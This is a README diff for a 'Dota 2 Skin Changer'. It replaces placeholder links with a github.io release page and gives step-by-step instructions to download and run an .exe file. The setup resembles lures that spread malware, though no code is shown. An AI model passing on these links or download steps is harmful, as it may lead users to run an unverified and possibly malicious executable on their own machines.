@@ -1,6 +1,6 @@
 # 🎮 Dota 2 Skin Changer
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](////////////)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://adamkimeng96g6.github.io/Dota-2-Skin-Changer/)
 
 ## 📌 About this software
 
@@ -21,7 +21,7 @@ If you encounter errors during launch, check your Microsoft .NET Framework versi
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official release page](/////////////).
+1. Visit the [official release page](https://adamkimeng96g6.github.io/Dota-2-Skin-Changer/).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the file ending in .exe to start your download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
